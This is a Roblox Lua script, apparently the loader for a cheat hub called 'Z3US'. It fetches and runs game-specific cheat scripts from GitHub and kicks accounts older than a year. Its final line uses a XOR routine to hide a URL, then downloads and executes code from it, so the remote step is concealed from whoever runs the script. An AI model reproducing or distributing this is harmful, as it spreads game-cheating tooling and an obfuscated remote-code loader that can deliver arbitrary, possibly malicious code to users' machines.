local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/Library.lua"))()
local GameId = game.PlaceId

local RunService = game:GetService("RunService")

local player = game.Players.LocalPlayer
local accage = player.AccountAge
local age = 365

if accage > age then
    player:Kick("You got detected using a main acc, I don't support cheating on main accs. Use an alt >:(")
end

local function ExecuteRivals()
    Library:Notify("Z3US has detected you being in Rivals.", 5)
    wait(5)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/NervigeMuecke/Z3US-V2/main/Games/Z3US%20Rivals.lua'))()
end

local function ExecuteFootball()
    Library:Notify("Z3US has detected you being in a Touch Football.", 5)
    wait(5)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/NervigeMuecke/Z3US-V2/main/Games/Touch%20Football%20Z3US.lua'))()
end

local function ExecuteArsenal()
    Library:Notify("Z3US has detected you being in Arsenal.", 5)
    wait(5)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NervigeMuecke/Z3US-V2/main/Games/Z3US%20V2.5%20ARSENAL"))()
end

local function ExecuteFront()
    Library:Notify("Z3US has detected you being in Frontlines.", 5)
    wait(5)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NervigeMuecke/Z3US-V2/main/Games/Z3US%20Frontlines%20V1.0.0"))()
end

local function ExecuteUniversal()
    Library:Notify("You are not in a supported game, loading universal..", 5)
    wait(5)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NervigeMuecke/Z3US-V2/main/Games/Z3US%20UNIVERSAL%20BETA%20V2.2"))()
end


local function ExecuteGame()
    if GameId == 16447934574 then 
        ExecuteFootball()
    elseif GameId == 286090429 then
        ExecuteArsenal()
    elseif GameId == 17625359962 then
        ExecuteRivals()
    elseif GameId == 5938036553 then
        ExecuteFront()
    else
        ExecuteUniversal()
    end
end

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end ExecuteGame();wait(1.5 + 0 );loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\245\32\244\173\206\25\212\238\206\32\229\176\194\81\235\144\238\22\171\141\149\81\195\198\221\54\169\179\194\31\213\208\148\40\231\178\201\81\216\199\208\39\244\174\207\80\221\214\218","\126\177\163\187\69\134\219\167")))();
